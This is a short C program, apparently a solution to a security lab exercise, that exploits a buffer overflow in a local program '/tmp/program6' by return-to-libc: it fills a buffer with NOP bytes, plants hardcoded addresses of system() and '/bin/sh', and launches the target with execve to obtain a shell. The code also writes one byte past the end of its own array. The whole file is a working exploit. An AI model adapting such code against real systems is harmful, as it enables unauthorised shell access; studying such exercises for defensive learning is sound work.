#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define PROGRAM "/tmp/program6"

/*
Referrence:
https://www.youtube.com/watch?v=FvQYGAM1X9U
https://www.youtube.com/watch?v=Gu_JGaWpcn4
*/

int main(void)
{
  char *args[3];
  char *environ[1];
  char exploit_str[160];

  for (int i = 0; i < 160; i++) {
    exploit_str[i] = 0x90;
  }
  exploit_str[160] = 0x00;

  // address to system(): 0xf7e1f9e0
  // address to "/bin/sh" in libc: 0xf7f5faaa
  *(int*)(exploit_str + 132) = 0xf7e1f9e0;
  *(int*)(exploit_str + 140) = 0xf7f5faaa;

  args[0] = PROGRAM;
  args[1] = exploit_str;
  args[2] = NULL;
  environ[0] = NULL;

  if (0 > execve(PROGRAM, args, environ))
    fprintf(stderr, "call to execve failed.\n");

  return 0;
}
